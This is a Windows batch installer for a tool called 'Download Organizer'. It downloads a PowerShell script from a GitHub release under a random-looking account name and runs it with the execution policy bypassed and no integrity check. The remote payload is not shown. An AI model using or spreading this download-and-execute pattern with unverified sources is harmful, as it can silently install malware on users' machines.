@echo off
echo Download Organizer setup is starting...
set "PS1=%TEMP%\download-organizer-install.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol='Tls12'; $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -UseBasicParsing 'https://github.com/ahhopglza9/download-organizer/releases/latest/download/install.ps1' -OutFile $env:TEMP\download-organizer-install.ps1"
if errorlevel 1 (
  echo.
  echo Could not download the installer. Please check your internet connection and try again.
  pause
  exit /b 1
)
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
